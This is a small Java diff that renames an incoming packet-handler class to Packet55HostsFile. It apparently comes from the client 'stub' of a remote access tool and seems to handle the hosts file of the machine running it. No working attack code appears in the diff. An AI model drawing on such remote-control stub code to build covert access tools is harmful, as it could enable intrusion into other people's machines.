@@ -9,7 +9,7 @@ import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.stub.packets.outgoing.Packet38HostFile;
 
 
-public class PacketGETHOSTFI extends AbstractIncomingPacket {
+public class Packet55HostsFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
